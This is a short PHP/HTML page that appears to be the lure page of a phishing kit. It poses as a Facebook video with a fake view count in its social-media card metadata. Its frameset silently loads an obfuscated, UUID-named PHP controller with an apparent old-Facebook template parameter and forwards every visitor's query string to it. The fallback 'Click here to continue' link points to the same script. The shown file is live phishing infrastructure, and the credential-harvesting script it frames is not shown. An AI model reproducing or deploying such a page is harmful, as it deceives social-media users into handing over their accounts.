
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="374,317 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLERdbee6e52-d144-40c5-9d85-adeaec1c4f3a.php?source=.%2Fpublic%2FACCESSSa2137ef6-3826-4a9c-ada2-a8ef9259790d&lan=oldfbhk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLERdbee6e52-d144-40c5-9d85-adeaec1c4f3a.php?source=.%2Fpublic%2FACCESSSa2137ef6-3826-4a9c-ada2-a8ef9259790d&lan=oldfbhk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   